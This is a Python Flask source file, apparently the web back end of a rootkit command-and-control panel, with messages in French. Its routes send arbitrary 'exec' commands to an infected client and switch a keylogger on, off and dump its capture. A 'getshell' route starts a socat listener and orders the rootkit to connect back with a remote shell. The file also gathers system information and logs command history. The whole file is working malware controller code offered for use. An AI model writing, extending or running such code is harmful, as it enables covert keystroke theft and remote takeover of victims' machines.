from app import app
import config as cfg
from flask import jsonify, request
from utils.socat import run_socat_shell
import threading
import time
import re

def getClientInfos():
    if not cfg.rootkit_connexion:
        return {
            "authenticated": False,
            "rootkit_address": None,
            "last_command": None,
        }

    ip = cfg.rootkit_connexion.get_client_ip()
    port = cfg.rootkit_connexion.get_listening_port()
    history = cfg.rootkit_connexion.get_command_history()
    last_command = history[-1]['command'] if history else None

    return {
        "authenticated": cfg.rootkit_connexion.is_authenticated(),
        "rootkit_address": [ip, port] if ip and port else None,
        "last_command": last_command,
    }

@app.route('/client-info', methods=['GET'])
def clientInfo():
    info = getClientInfos()
    return jsonify(info), 200

@app.route('/get-history', methods=['GET'])
def get_history():
    if not cfg.rootkit_connexion:
        return jsonify({'error': 'No rootkit connection available.'}), 503

    history = cfg.rootkit_connexion.get_command_history()
    if not history:
        return jsonify({'error': 'No command history available.'}), 404

    return jsonify(history), 200

##### ROOTKIT COMMANDS HANDLER #####

def handle_command(prefix, default_use_history):
    data = {}
    if request.is_json:
        data = request.get_json(silent=True) or {}
    else:
        data = request.form.to_dict() or {}

    cmd = data.get('command', '').strip() if isinstance(data, dict) else ''
    use_history = data.get('use_history', default_use_history)

    full_cmd = f"{prefix} {cmd}".strip()

    try:
        if use_history:
            result = cfg.rootkit_connexion.send_to_client_with_history(full_cmd)
        else:
            result = cfg.rootkit_connexion.send_to_client(full_cmd)
    except Exception as e:
        result = f"💥 Erreur : {e}"

    return jsonify(result), 200


@app.route('/send', methods=['POST'])
def send():
    return handle_command("", False)

@app.route('/exec', methods=['POST'])
def exec_command():
    return handle_command("exec", True)

@app.route('/connect', methods=['POST'])
def connect_command():
    response, status_code = handle_command("connect", False)
    if cfg.rootkit_connexion.is_authenticated():
        return response, 200
    else:
        return response, 403

@app.route('/getshell', methods=['POST'])
def getshell():
    response = {"status": "error", "message": ""}
    port = request.json.get('port')

    try:
        # Vérifier si le port est valide
        port = int(port)
        if port < 1024 or port > 65535:
            response["message"] = "❌ Le port doit être entre 1024 et 65535."
        else:
            threading.Thread(target=run_socat_shell, args=(port,), daemon=True).start()
            time.sleep(1)

            cfg.rootkit_connexion.send_to_client(f"getshell {port}")
            response["status"] = "success"
            response["message"] = f"🚀 Shell distant lancé sur le port {port}."

    except ValueError:
        response["message"] = "❌ Le port doit être un nombre valide."
        return response, 400

    return response, 200

@app.route('/killcom', methods=['POST'])
def killcom_command():
    return handle_command("killcom", False)

@app.route('/disconnect', methods=['POST'])
def disconnect_command():
    response, status_code = handle_command("disconnect", False)
    if not cfg.rootkit_connexion.is_authenticated():
        return response, 200
    else:
        return response, 403

@app.route('/klgon', methods=['POST'])
def klgon_command():
    return handle_command("klgon", False)

@app.route('/klg', methods=['GET'])
def klg_command():
    return handle_command("klg", False)

@app.route('/klgoff', methods=['POST'])
def klgoff_command():
    return handle_command("klgoff", False)

@app.route('/sysinfo', methods=['GET'])
def sysinfo_command():
    result = cfg.rootkit_connexion.get_client_sysinfo()
    if result is None:
        return jsonify({'error': 'No client sysinfo available.'}), 404
    return jsonify(result), 200

@app.route('/diskusage', methods=['GET'])
def diskusage_command():
    return handle_command("exec df -h", False)

@app.route('/cpu-ram', methods=['GET'])
def cpu_ram_command():
    response, status_code = handle_command('exec grep "^cpu " /proc/stat', False)
    cpu_response_data = response.get_data(as_text=True).split("stdout:\\n")[-1].split("stderr:")[0].strip().replace('\\n', '\n')

    response, status_code = handle_command('exec free -m', False)
    ram_response_data = response.get_data(as_text=True).split("stdout:\\n")[-1].split("stderr:")[0].strip().replace('\\n', '\n')
    
    response_data = cpu_response_data + ram_response_data

    if status_code == 200:
        try:
            lines = response_data.strip().splitlines()

            if len(lines) < 3:
                return jsonify({"error": "Not enough lines in command output"}), 500

            cpu_line = lines[0]
            mem_line = lines[2]  # "Mem:" values

            # CPU parsing
            cpu_values = list(map(int, re.findall(r'\d+', cpu_line)))
            idle_time = cpu_values[3]
            total_time = sum(cpu_values)
            cpu_usage = 100 * (1 - (idle_time / total_time))

            # RAM parsing
            mem_values = list(map(int, re.findall(r'\d+', mem_line)))
            ram_total = mem_values[0]
            ram_used = mem_values[1]

            parsed_data = {
                "cpu": round(cpu_usage, 1),
                "ram_used": ram_used,
                "ram_total": ram_total
            }
            return jsonify(parsed_data), 200

        except Exception as e:
            return jsonify({"error": f"Failed to parse response: {str(e)}"}), 500

    return response, status_code
